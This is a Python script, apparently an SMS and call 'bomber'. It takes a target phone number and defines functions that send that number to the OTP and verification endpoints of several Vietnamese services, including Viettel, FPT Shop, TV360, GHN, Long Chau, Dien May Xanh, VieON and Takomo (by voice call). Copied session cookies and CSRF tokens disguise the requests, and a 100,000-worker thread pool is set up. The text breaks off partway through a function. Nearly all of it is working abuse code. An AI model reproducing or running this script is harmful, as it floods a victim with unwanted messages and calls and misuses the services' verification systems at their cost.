import requests,sys,time,json
from concurrent.futures import ThreadPoolExecutor
threading = ThreadPoolExecutor(max_workers=int(100000))
phone = sys.argv[1]


def myvietel():
    cookies = {
        'cookie_saleChannel0m667giXuBHbfNGgr2R3tgN0UpU6INNPMMC55BHI': 'eyJpdiI6IjNndVNDdGpOVzFkV2NSSUNQR2grZVE9PSIsInZhbHVlIjoiZVdWZkV6YWFSQlNhbm8zbVhJKzJEK0tIUDViQWxOZHJtTndcL0k5Y2JWS01MM2J2TEpOSitCWjE0N1RWMmswZ1lhUWhyOEtIYklKOHh0bVpkZVRFcFRyZDdCcEQwMW1Ma0U1em9yZ3czbVc5QlJLc1Nxd3BPZ0w3REJvU002b1ZnQUVGWnhvamE4akJXZFlmS0xzWnRrOGwxRXNCYVM5ZFwvS0Faam9ndnphWkswXC9vMmJhM0JWRndoaDljeGpoYUQ5bk84ZHRsYkdIZXlMOEVYZVwvdXdSQWc0N1czUks5SStwbDhjNFVkUjd0UjQ9IiwibWFjIjoiY2Q5YmY2OGQ1MjZhZjA5ODFhYzk1OWFkNTZlMDBiOWEzNzMxYTU3NGRlYzc0ZTljMDgwZTY1OTE4OTA5YzJlNCJ9',
        'laravel_session': '0m667giXuBHbfNGgr2R3tgN0UpU6INNPMMC55BHI',
        'redirectLogin': 'https://viettel.vn/internet-truyenhinh/toan-trinh/?ch=DUYENNTC1_HCM_HKD&gclid=CjwKCAjw6p-oBhAYEiwAgg2PgpqUF1PipuENFbHvGYu6J7Vbocd5JxTg_B7dEwkvMBYfj2LBC9EEIhoCd-0QAvD_BwE',
        'XSRF-TOKEN': 'eyJpdiI6InpSRGNNb1dtZ1czWEZlMFJcL2k5elhnPT0iLCJ2YWx1ZSI6InVidVduSjN3cWlIZjFKOFk4WFwvU0pnb0RKN0NCM3ZlMGp5NEJlTlhOSFdyeXp2Z3lHRWxUZ2xvWFlZVWdyXC9YYSIsIm1hYyI6IjliY2FmNTVjNDk0N2NmOTM1ZWM2NDE1ODRhY2Y4NWZiODU3M2Q0OGI0MTYwYmE5MDczZWFmNTA2OTA1Mzk5ZDMifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'cookie_saleChannel0m667giXuBHbfNGgr2R3tgN0UpU6INNPMMC55BHI=eyJpdiI6IjNndVNDdGpOVzFkV2NSSUNQR2grZVE9PSIsInZhbHVlIjoiZVdWZkV6YWFSQlNhbm8zbVhJKzJEK0tIUDViQWxOZHJtTndcL0k5Y2JWS01MM2J2TEpOSitCWjE0N1RWMmswZ1lhUWhyOEtIYklKOHh0bVpkZVRFcFRyZDdCcEQwMW1Ma0U1em9yZ3czbVc5QlJLc1Nxd3BPZ0w3REJvU002b1ZnQUVGWnhvamE4akJXZFlmS0xzWnRrOGwxRXNCYVM5ZFwvS0Faam9ndnphWkswXC9vMmJhM0JWRndoaDljeGpoYUQ5bk84ZHRsYkdIZXlMOEVYZVwvdXdSQWc0N1czUks5SStwbDhjNFVkUjd0UjQ9IiwibWFjIjoiY2Q5YmY2OGQ1MjZhZjA5ODFhYzk1OWFkNTZlMDBiOWEzNzMxYTU3NGRlYzc0ZTljMDgwZTY1OTE4OTA5YzJlNCJ9; laravel_session=0m667giXuBHbfNGgr2R3tgN0UpU6INNPMMC55BHI; redirectLogin=https://viettel.vn/internet-truyenhinh/toan-trinh/?ch=DUYENNTC1_HCM_HKD&gclid=CjwKCAjw6p-oBhAYEiwAgg2PgpqUF1PipuENFbHvGYu6J7Vbocd5JxTg_B7dEwkvMBYfj2LBC9EEIhoCd-0QAvD_BwE; XSRF-TOKEN=eyJpdiI6InpSRGNNb1dtZ1czWEZlMFJcL2k5elhnPT0iLCJ2YWx1ZSI6InVidVduSjN3cWlIZjFKOFk4WFwvU0pnb0RKN0NCM3ZlMGp5NEJlTlhOSFdyeXp2Z3lHRWxUZ2xvWFlZVWdyXC9YYSIsIm1hYyI6IjliY2FmNTVjNDk0N2NmOTM1ZWM2NDE1ODRhY2Y4NWZiODU3M2Q0OGI0MTYwYmE5MDczZWFmNTA2OTA1Mzk5ZDMifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/internet-truyenhinh/toan-trinh/?ch=DUYENNTC1_HCM_HKD&gclid=CjwKCAjw6p-oBhAYEiwAgg2PgpqUF1PipuENFbHvGYu6J7Vbocd5JxTg_B7dEwkvMBYfj2LBC9EEIhoCd-0QAvD_BwE',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'X-CSRF-TOKEN': 'IsFbAIu3zZCkbn7pkrrZnoTS4MaK7AXwvU7CKVGU',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InpSRGNNb1dtZ1czWEZlMFJcL2k5elhnPT0iLCJ2YWx1ZSI6InVidVduSjN3cWlIZjFKOFk4WFwvU0pnb0RKN0NCM3ZlMGp5NEJlTlhOSFdyeXp2Z3lHRWxUZ2xvWFlZVWdyXC9YYSIsIm1hYyI6IjliY2FmNTVjNDk0N2NmOTM1ZWM2NDE1ODRhY2Y4NWZiODU3M2Q0OGI0MTYwYmE5MDczZWFmNTA2OTA1Mzk5ZDMifQ==',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
###
def fptshop():
    cookies = {
        'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '93565a20-d5bd-4b1d-921f-6b833256ae5a',
        '_gcl_au': '1.1.274895891.1694312337',
        'fpt_uuid': '%226f1d835a-1946-4291-a9ff-241e68bc2965%22',
        'ajs_group_id': 'null',
        '__zi': '3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpfsmiKYNpVgANR31I0UfUWgjP95uHqcAUiDZGs.1',
        '_fbp': 'fb.2.1694312339667.1405504295',
        '__admUTMtime': '1694312339',
        '_tt_enable_cookie': '1',
        '_ttp': 'R2G1TDK2APp-wahdJlD64b-MjP_',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        '__RC': '59',
        '__R': '3',
        '_hjSessionUser_731679': 'eyJpZCI6ImRiNTJkYjEwLTE2NWMtNTcxZS05NDdkLWI5NzZhZWY2ODk1NSIsImNyZWF0ZWQiOjE2OTQzMTIzMzk2NDYsImV4aXN0aW5nIjp0cnVlfQ==',
        '__tb': '0',
        '__IP': '712264848',
        '_gid': 'GA1.3.872342835.1695128560',
        '_gat': '1',
        'vMobile': '1',
        '_ga': 'GA1.1.1813377516.1694312336',
        'cf_clearance': 'ilQ6k.2nVyGvZkL437P7skB9zv5GWtWlHZ9KduAAHf8-1695128562-0-1-60834c65.4b3697cc.37821385-0.2.1695128562',
        '_ga_ZR815NQ85K': 'GS1.1.1695128560.3.0.1695128561.59.0.0',
        '__rtbh.lid': '%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22LZP9yq8b913yis2cEPCF%22%7D',
        '_hjIncludedInSessionSample_731679': '0',
        '_hjSession_731679': 'eyJpZCI6ImViNTgxNTAwLTViNTktNGRkOC05MjVkLTIzZjg2NmFmOTZiMSIsImNyZWF0ZWQiOjE2OTUxMjg1NjIyMzEsImluU2FtcGxlIjpmYWxzZX0=',
        '_hjAbsoluteSessionInProgress': '0',
        '__uif': '__uid%3A8589680751712265079%7C__ui%3A1%252C6%7C__create%3A1689680751',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=93565a20-d5bd-4b1d-921f-6b833256ae5a; _gcl_au=1.1.274895891.1694312337; fpt_uuid=%226f1d835a-1946-4291-a9ff-241e68bc2965%22; ajs_group_id=null; __zi=3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpfsmiKYNpVgANR31I0UfUWgjP95uHqcAUiDZGs.1; _fbp=fb.2.1694312339667.1405504295; __admUTMtime=1694312339; _tt_enable_cookie=1; _ttp=R2G1TDK2APp-wahdJlD64b-MjP_; __iid=; __iid=; __su=0; __su=0; __RC=59; __R=3; _hjSessionUser_731679=eyJpZCI6ImRiNTJkYjEwLTE2NWMtNTcxZS05NDdkLWI5NzZhZWY2ODk1NSIsImNyZWF0ZWQiOjE2OTQzMTIzMzk2NDYsImV4aXN0aW5nIjp0cnVlfQ==; __tb=0; __IP=712264848; _gid=GA1.3.872342835.1695128560; _gat=1; vMobile=1; _ga=GA1.1.1813377516.1694312336; cf_clearance=ilQ6k.2nVyGvZkL437P7skB9zv5GWtWlHZ9KduAAHf8-1695128562-0-1-60834c65.4b3697cc.37821385-0.2.1695128562; _ga_ZR815NQ85K=GS1.1.1695128560.3.0.1695128561.59.0.0; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22LZP9yq8b913yis2cEPCF%22%7D; _hjIncludedInSessionSample_731679=0; _hjSession_731679=eyJpZCI6ImViNTgxNTAwLTViNTktNGRkOC05MjVkLTIzZjg2NmFmOTZiMSIsImNyZWF0ZWQiOjE2OTUxMjg1NjIyMzEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; __uif=__uid%3A8589680751712265079%7C__ui%3A1%252C6%7C__create%3A1689680751',
        'Origin': 'https://fptshop.com.vn',
        'Referer': 'https://fptshop.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    data = {
        'phone': phone,
        'typeReset': '0',
    }

    response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data)
###
def tv360():
    cookies = {
        'acw_tc': '9aaf940a6cdcc4acd3e07b1b10c328880d214785e42ba285709248963ab8e7a5',
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'device-id': 's%3Aweb_a1c2745d-b0ed-44cf-9010-c6cc48b1f1f7.6ArWYearisaeiXLvpEQeILU0Rpeqo7JTv9xCClcNgJA',
        'shared-device-id': 'web_a1c2745d-b0ed-44cf-9010-c6cc48b1f1f7',
        'screen-size': 's%3A1280x720.%2Fl38KhYvKgwKxsNysIEM6VTkaAubb6utR0LoxEkjZsU',
        '_ga': 'GA1.2.2034489421.1694952395',
        '_gid': 'GA1.2.602838635.1694952395',
        'G_ENABLED_IDPS': 'google',
        'session-id': 's%3A863dae10-cab3-43c3-8dc8-947211574e72.LQTo2WBBjeNfjmkUhCA44gYfmlYX3SH68AZg2kSGzz0',
        '_ga_E5YP28Y8EF': 'GS1.1.1694952394.1.1.1694952571.0.0.0',
        '_ga_D7L53J0JMS': 'GS1.1.1694952394.1.1.1694952571.60.0.0',
    }
    headers = {
        'authority': 'tv360.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': 'acw_tc=9aaf940a6cdcc4acd3e07b1b10c328880d214785e42ba285709248963ab8e7a5; img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Aweb_a1c2745d-b0ed-44cf-9010-c6cc48b1f1f7.6ArWYearisaeiXLvpEQeILU0Rpeqo7JTv9xCClcNgJA; shared-device-id=web_a1c2745d-b0ed-44cf-9010-c6cc48b1f1f7; screen-size=s%3A1280x720.%2Fl38KhYvKgwKxsNysIEM6VTkaAubb6utR0LoxEkjZsU; _ga=GA1.2.2034489421.1694952395; _gid=GA1.2.602838635.1694952395; G_ENABLED_IDPS=google; session-id=s%3A863dae10-cab3-43c3-8dc8-947211574e72.LQTo2WBBjeNfjmkUhCA44gYfmlYX3SH68AZg2kSGzz0; _ga_E5YP28Y8EF=GS1.1.1694952394.1.1.1694952571.0.0.0; _ga_D7L53J0JMS=GS1.1.1694952394.1.1.1694952571.60.0.0',
        'origin': 'https://tv360.vn',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1694952571324',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }
    json_data = {
        'msisdn': phone,
    }
    response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
###
def ghn():
    headers = {
        'authority': 'online-gateway.ghn.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}   

    json_data = {
        'phone': phone,
        'type': 'register',
}   

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
###
def longchau(phone):
        headers = {
            'authority': 'api.nhathuoclongchau.com.vn',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'access-control-allow-origin': '*',
            'authorization': '',
            'content-type': 'application/json',
            'order-channel': '1',
            'origin': 'https://nhathuoclongchau.com.vn',
            'referer': 'https://nhathuoclongchau.com.vn/',
            'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-channel': 'EStore',
        }

        json_data = {
            'phoneNumber': phone,
            'otpType': 0,
            'fromSys': 'WEBKHLC',
        }

        response = requests.post(
            'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
            headers=headers,
            json=json_data,
        )
###
def inc():
    headers = {
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Origin': 'https://www.best-inc.vn',
        'Referer': 'https://www.best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }

    json_data = {
        'phoneNumber': phone,
        'verificationCodeType': 1,
    }

    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
####
def dmx():
    cookies = {
        '_gcl_au': '1.1.79323279.1695224590',
        '_gid': 'GA1.2.1529897882.1695224590',
        '_gat_UA-38936689-1': '1',
        '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1695224590%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_pk_id.8.8977': 'ab30890ea397cc91.1695224590.',
        '_pk_ses.8.8977': '1',
        '_fbp': 'fb.1.1695224590085.572828266',
        '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8ImUV2tmepFDqJx13sccnB7iwltpa-maVnaceJKMLO6cpG-aChNfJwcHotJlcS1fGrWlqfYdBaaySWu45hv_jO788Fw0QcFDyuEwQXaj2PpJZSfj02LESvNbY-NATGo5QEmq4j_k3OQ7OFSFIsu87r8',
        'DMX_Personal': '%7B%22UID%22%3A%22262eeb3254c80dd2df54459e5712395979b228c0%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        '_ga_Y7SWKJEHCE': 'GS1.1.1695224589.1.1.1695224592.57.0.0',
        '_ga': 'GA1.1.719063766.1695224590',
        'SvID': 'dmxcart2737|ZQsTE|ZQsTD',
        '_ga_5MXNSQHGT3': 'GS1.2.1695224590.1.1.1695224592.58.0.0',
        'cebs': '1',
        '_ce.clock_event': '1',
        '_ce.clock_data': '211%2C1.55.43.249%2C1%2C3357fadb0316939352bbdd4d5360a97f',
        'cebsp_': '1',
        '_ce.s': 'v~bcd374843a146000bcdeb5f09c38c56c7448ab99~lcw~1695224601425~vpv~0~gtrk.la~lmrwyhy0~lcw~1695224601432',
    }

    headers = {
        'authority': 'www.dienmayxanh.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.79323279.1695224590; _gid=GA1.2.1529897882.1695224590; _gat_UA-38936689-1=1; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1695224590%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.8.8977=ab30890ea397cc91.1695224590.; _pk_ses.8.8977=1; _fbp=fb.1.1695224590085.572828266; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8ImUV2tmepFDqJx13sccnB7iwltpa-maVnaceJKMLO6cpG-aChNfJwcHotJlcS1fGrWlqfYdBaaySWu45hv_jO788Fw0QcFDyuEwQXaj2PpJZSfj02LESvNbY-NATGo5QEmq4j_k3OQ7OFSFIsu87r8; DMX_Personal=%7B%22UID%22%3A%22262eeb3254c80dd2df54459e5712395979b228c0%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; _ga_Y7SWKJEHCE=GS1.1.1695224589.1.1.1695224592.57.0.0; _ga=GA1.1.719063766.1695224590; SvID=dmxcart2737|ZQsTE|ZQsTD; _ga_5MXNSQHGT3=GS1.2.1695224590.1.1.1695224592.58.0.0; cebs=1; _ce.clock_event=1; _ce.clock_data=211%2C1.55.43.249%2C1%2C3357fadb0316939352bbdd4d5360a97f; cebsp_=1; _ce.s=v~bcd374843a146000bcdeb5f09c38c56c7448ab99~lcw~1695224601425~vpv~0~gtrk.la~lmrwyhy0~lcw~1695224601432',
        'origin': 'https://www.dienmayxanh.com',
        'referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8ImUV2tmepFDqJx13sccnB6CENRTlKbrCHMoCjVxTPoRqxo4Jrei20gnA6VGFLq0Dv_ll1qKEsrkaZQrZQBnow2Q40_t3d9OCtFTVfUXRg0_2hUkaMrzxaLoVn6RunyFo7UhY2BK68xx_xDxsiitC50',
    }

    response = requests.post(
        'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )
###
def vieon():
  data = f'phone_number={phone}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
  head = {
    "Host":"api.vieon.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/x-www-form-urlencoded",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vieon.vn/",
    "accept-encoding":"gzip, deflate, br",
}
  rq = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",data=data,headers=head).json()
def call5():
    cookies = {
        '_gcl_au': '1.1.842199874.1695554382',
        '_gid': 'GA1.2.2082346579.1695554382',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_2281843': '0',
        '_hjSession_2281843': 'eyJpZCI6ImJiNjM0YjVkLWQxMzEtNGQ4OS1hOTRmLWFiMjIwYzhmMWJiNyIsImNyZWF0ZWQiOjE2OTU1NTQzODI0NzcsImluU2FtcGxlIjpmYWxzZX0=',
        '_hjAbsoluteSessionInProgress': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'U2q9_g7uOSjbT_n90LRQMocXcYp',
        '_fbp': 'fb.1.1695554382651.1400857930',
        '_fw_crm_v': '0cc660e3-9b59-4c3d-e5c1-7a3a4c4da495',
        '_hjIncludedInSessionSample_2281853': '0',
        '_hjSession_2281853': 'eyJpZCI6IjAyZTk0Zjk1LWQ3NTctNGViYS05MjgxLTAyNzE0YjU5ZWU4YyIsImNyZWF0ZWQiOjE2OTU1NTQzOTA5OTgsImluU2FtcGxlIjpmYWxzZX0=',
        '_gat_UA-187725374-2': '1',
        '_hjSessionUser_2281843': 'eyJpZCI6IjI1NWZkZjUyLWJiNDItNWQyZS1hNGRiLTE2ZjQ4N2RiOTNlYyIsImNyZWF0ZWQiOjE2OTU1NTQzODI0NzYsImV4aXN0aW5nIjp0cnVlfQ==',
        '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM1NTgwNjgwNw.NFzhCjlvyLtI2QRI4mLa8xW09juSfF_ipp4XQFzDxv8',
        '_ga_ZBQ18M247M': 'GS1.1.1695554382.1.1.1695554456.52.0.0',
        '_gat_UA-187725374-1': '1',
        '_ga_ZN0EBP68G5': 'GS1.1.1695554391.1.1.1695554456.60.0.0',
        '_hjSessionUser_2281853': 'eyJpZCI6IjY5NjYzYjU3LWE2MWMtNWQwMC1hMWE2LTY4ZTEzOTllMzU2ZiIsImNyZWF0ZWQiOjE2OTU1NTQzOTA5OTUsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga': 'GA1.2.1693527442.1695554382',
    }

    headers = {
        'authority': 'lk.takomo.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9',
        'content-type': 'application/json;charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.842199874.1695554382; _gid=GA1.2.2082346579.1695554382; _hjFirstSeen=1; _hjIncludedInSessionSample_2281843=0; _hjSession_2281843=eyJpZCI6ImJiNjM0YjVkLWQxMzEtNGQ4OS1hOTRmLWFiMjIwYzhmMWJiNyIsImNyZWF0ZWQiOjE2OTU1NTQzODI0NzcsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _tt_enable_cookie=1; _ttp=U2q9_g7uOSjbT_n90LRQMocXcYp; _fbp=fb.1.1695554382651.1400857930; _fw_crm_v=0cc660e3-9b59-4c3d-e5c1-7a3a4c4da495; _hjIncludedInSessionSample_2281853=0; _hjSession_2281853=eyJpZCI6IjAyZTk0Zjk1LWQ3NTctNGViYS05MjgxLTAyNzE0YjU5ZWU4YyIsImNyZWF0ZWQiOjE2OTU1NTQzOTA5OTgsImluU2FtcGxlIjpmYWxzZX0=; _gat_UA-187725374-2=1; _hjSessionUser_2281843=eyJpZCI6IjI1NWZkZjUyLWJiNDItNWQyZS1hNGRiLTE2ZjQ4N2RiOTNlYyIsImNyZWF0ZWQiOjE2OTU1NTQzODI0NzYsImV4aXN0aW5nIjp0cnVlfQ==; _cabinet_key=SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM1NTgwNjgwNw.NFzhCjlvyLtI2QRI4mLa8xW09juSfF_ipp4XQFzDxv8; _ga_ZBQ18M247M=GS1.1.1695554382.1.1.1695554456.52.0.0; _gat_UA-187725374-1=1; _ga_ZN0EBP68G5=GS1.1.1695554391.1.1.1695554456.60.0.0; _hjSessionUser_2281853=eyJpZCI6IjY5NjYzYjU3LWE2MWMtNWQwMC1hMWE2LTY4ZTEzOTllMzU2ZiIsImNyZWF0ZWQiOjE2OTU1NTQzOTA5OTUsImV4aXN0aW5nIjp0cnVlfQ==; _ga=GA1.2.1693527442.1695554382',
        'origin': 'https://lk.takomo.vn',
        'referer': 'https://lk.takomo.vn/?phone='+phone+'&amount=10000000&term=30&utm_source=goodaff_cps&utm_medium=cpa&utm_campaign=for-lead&utm_content=2&click_id=31619c4e717418dc6dcc532fc3339d17',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'data': {
            'phone': phone,
            'code': 'resend',
            'channel': 'ivr',
        },
    }

    response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers, json=json_data)
###
def galaxy():
    headers = {
        'authority': 'api.glxplay.io',
        'accept': '*/*',
        'accept-language': 'vi',
